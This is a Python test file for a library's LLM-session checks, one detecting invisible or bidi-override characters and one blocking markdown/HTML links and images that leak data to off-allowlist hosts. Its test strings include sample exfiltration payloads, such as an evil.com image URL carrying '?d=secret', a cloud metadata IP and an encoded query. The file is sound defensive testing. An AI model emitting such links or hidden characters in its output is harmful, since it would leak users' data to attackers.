"""Tests for no_invisible_text and no_exfil_links (injection/exfil defenses)."""

import pytest

from pactrun import Contract, no_exfil_links, no_invisible_text


# ---------------------------------------------------------------------------
# no_invisible_text
# ---------------------------------------------------------------------------

def _run_text(pred, *, output=None, input=None, tool_result=None):
    c = Contract("t").require(pred, on_fail="log")
    with c.session() as s:
        if tool_result is not None:
            s.emit_tool_call("read", result=tool_result)
        else:
            s.emit_llm_response(model="m", output=output or "", input=input)
    return s


def test_clean_ascii_passes():
    assert _run_text(no_invisible_text(), output="hello world").is_compliant


def test_zero_width_fails():
    s = _run_text(no_invisible_text(), output="he​llo")
    assert not s.is_compliant


def test_message_names_codepoint_not_char():
    s = _run_text(no_invisible_text(), output="he​llo")
    surfaced = (s.violations[0].actual or "") + (s.violations[0].message or "")
    assert "U+200B" in surfaced
    assert "​" not in surfaced  # the char itself is never echoed


def test_tags_block_fails():
    s = _run_text(no_invisible_text(), output="hi\U000e0041\U000e0042")  # tag 'A' 'B'
    assert not s.is_compliant


def test_bidi_override_fails():
    s = _run_text(no_invisible_text(), output="price 100‮ drowssap")
    assert not s.is_compliant


def test_scan_surface_selection():
    # default scans tool_result; narrowing to output-only ignores a tainted tool_result
    bad = "data​here"
    assert not _run_text(no_invisible_text(scan=("tool_result",)), tool_result=bad).is_compliant
    assert _run_text(no_invisible_text(scan=("output",)), tool_result=bad).is_compliant


def test_max_occurrences_boundary():
    # one zero-width allowed when max_occurrences=1
    assert _run_text(no_invisible_text(max_occurrences=1), output="a​b").is_compliant
    assert not _run_text(no_invisible_text(max_occurrences=1), output="a​b​c").is_compliant


def test_homoglyph_opt_in():
    cyrillic_o = "о"  # Cyrillic 'о'
    word = f"c{cyrillic_o}nfig"
    assert _run_text(no_invisible_text(), output=word).is_compliant  # off by default
    s = _run_text(no_invisible_text(detect=("homoglyph",)), output=word)
    assert not s.is_compliant


def test_bad_detect_rejected():
    with pytest.raises(ValueError):
        no_invisible_text(detect=("magic",))


def test_bad_scan_rejected():
    with pytest.raises(ValueError):
        no_invisible_text(scan=("everywhere",))


def test_none_surfaces_pass():
    c = Contract("t").require(no_invisible_text(), on_fail="log")
    with c.session() as s:
        s.emit_llm_response(model="m", output="")
    assert s.is_compliant


# ---------------------------------------------------------------------------
# no_exfil_links
# ---------------------------------------------------------------------------

def _run_out(pred, output):
    c = Contract("t").require(pred, on_fail="log")
    with c.session() as s:
        s.emit_llm_response(model="m", output=output)
    return s


def test_clean_output_passes():
    assert _run_out(no_exfil_links(allow_hosts=["*.mycorp.com"]), "just some text").is_compliant


def test_offsite_markdown_image_fails():
    s = _run_out(no_exfil_links(allow_hosts=["*.mycorp.com"]),
                 "![x](https://evil.com/log?d=secret)")
    assert not s.is_compliant


def test_allowlisted_image_passes():
    s = _run_out(no_exfil_links(allow_hosts=["*.mycorp.com"]),
                 "![logo](https://cdn.mycorp.com/logo.png)")
    assert s.is_compliant


def test_html_img_form():
    s = _run_out(no_exfil_links(allow_hosts=["mycorp.com"]),
                 '<img src="https://evil.com/p.png">')
    assert not s.is_compliant


def test_html_anchor_form():
    s = _run_out(no_exfil_links(allow_hosts=["mycorp.com"], block_images=False),
                 '<a href="https://evil.com/x">click</a>')
    assert not s.is_compliant


def test_block_private_catches_metadata_ip():
    s = _run_out(no_exfil_links(), "![x](http://169.254.169.254/latest/meta-data/)")
    assert not s.is_compliant


def test_deny_hosts_override():
    s = _run_out(no_exfil_links(deny_hosts=["evil.com"]), "[link](https://evil.com/x)")
    assert not s.is_compliant


def test_zero_click_image_blocked_without_allowlist():
    # block_images=True default: any remote image with no allowlist fails
    s = _run_out(no_exfil_links(), "![x](https://anything.example/p.png)")
    assert not s.is_compliant


def test_forms_filter():
    # only check markdown_link; an image to evil host is ignored
    s = _run_out(no_exfil_links(allow_hosts=["mycorp.com"], forms=("markdown_link",)),
                 "![x](https://evil.com/p.png)")
    assert s.is_compliant


def test_relative_and_mailto_ignored():
    s = _run_out(no_exfil_links(allow_hosts=["mycorp.com"]),
                 "[a](/local/path) [b](mailto:x@y.com) [c](#anchor)")
    assert s.is_compliant


def test_encoded_query_flagged():
    enc = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2"
    s = _run_out(
        no_exfil_links(allow_hosts=["cdn.mycorp.com"], flag_encoded_query=True),
        f"![x](https://cdn.mycorp.com/p.png?d={enc})",
    )
    assert not s.is_compliant


def test_benign_query_passes_with_flag():
    s = _run_out(
        no_exfil_links(allow_hosts=["cdn.mycorp.com"], flag_encoded_query=True),
        "![x](https://cdn.mycorp.com/p.png?w=64&h=64)",
    )
    assert s.is_compliant


def test_protocol_relative_url_caught():
    s = _run_out(no_exfil_links(allow_hosts=["mycorp.com"]), "![x](//evil.com/p.png)")
    assert not s.is_compliant


def test_bad_forms_rejected():
    with pytest.raises(ValueError):
        no_exfil_links(forms=("rss",))


def test_registered():
    import pactrun
    names = pactrun.list_predicates()
    assert "no_invisible_text" in names
    assert "no_exfil_links" in names
